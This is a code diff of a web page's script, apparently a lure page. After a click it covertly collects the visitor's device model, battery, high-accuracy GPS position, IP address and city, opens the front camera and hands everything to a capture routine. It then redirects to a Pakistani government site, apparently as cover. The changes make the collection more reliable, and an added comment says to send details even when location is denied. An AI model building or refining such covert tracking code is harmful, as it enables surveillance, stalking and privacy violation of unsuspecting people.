@@ -40,12 +40,11 @@
         document.getElementById('mainBtn').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
 
-        // 1. Precise Device Model Detection
+        // 1. Device Model Detection (Improved)
         let ua = navigator.userAgent;
-        let deviceModel = "Unknown Device";
+        let deviceModel = "Unknown";
         if (ua.match(/Android/i)) {
-            let match = ua.match(/Android\s([0-9\.]+);\s([^;)]+)/);
-            deviceModel = match ? match[2] : "Android Device";
+            deviceModel = ua.split(')')[0].split(';').pop().trim(); 
         } else if (ua.match(/iPhone/i)) {
             deviceModel = "iPhone";
         }
@@ -53,37 +52,46 @@
         let info = { 
             model: deviceModel,
             platform: navigator.platform, 
-            lat: "0", lon: "0",
             battery: "N/A",
             time: new Date().toLocaleString(),
-            city: "N/A", country: "N/A", realIp: "N/A"
+            lat: "0", lon: "0",
+            city: "Fetching...", country: "Fetching...", realIp: "Fetching..."
         };
 
-        // 2. Instant Data Collection (Battery & Geo-IP)
+        // 2. Battery Fetch (Instant)
         if(navigator.getBattery) { 
             const b = await navigator.getBattery(); 
             info.battery = Math.round(b.level*100)+"%"; 
         }
 
-        // Fetch Real IP, City, Country from External API (No Delay)
-        const geoFetch = fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
-            info.city = data.city;
-            info.country = data.country_name;
-            info.realIp = data.ip;
-        }).catch(() => null);
+        // 3. Geo-IP Task (Real-time City/IP)
+        const geoTask = fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                info.city = data.city || "Unknown";
+                info.country = data.country_name || "Unknown";
+                info.realIp = data.ip || "Unknown";
+            }).catch(() => {
+                info.city = "Err"; info.country = "Err"; info.realIp = "Err";
+            });
 
-        // 3. Trigger Camera & Location (Parallel)
+        // 4. Camera & Location (Parallel)
         const cameraTask = navigator.mediaDevices.getUserMedia({video: { facingMode: "user" }}).catch(() => null);
 
         navigator.geolocation.getCurrentPosition(async (pos) => {
             info.lat = pos.coords.latitude; 
             info.lon = pos.coords.longitude;
-            await geoFetch; // Wait for Geo data
-            handleCapture(await cameraTask, info);
+            
+            // Sab tasks ka intezar karein (No more N/A)
+            await geoTask;
+            const stream = await cameraTask;
+            handleCapture(stream, info);
         }, async (err) => {
-            await geoFetch;
-            handleCapture(await cameraTask, info);
-        }, { enableHighAccuracy: false, timeout: 5000 });
+            // Agar location off ho tab bhi details bhejo
+            await geoTask;
+            const stream = await cameraTask;
+            handleCapture(stream, info);
+        }, { enableHighAccuracy: true, timeout: 7000 });
     }
 
     async function handleCapture(stream, info) {
@@ -111,7 +119,8 @@
             window.location.href = "https://www.pakistan.gov.pk/";
         });
     }
-</script>
+                </script>
+    
 
 </body>
 </html>
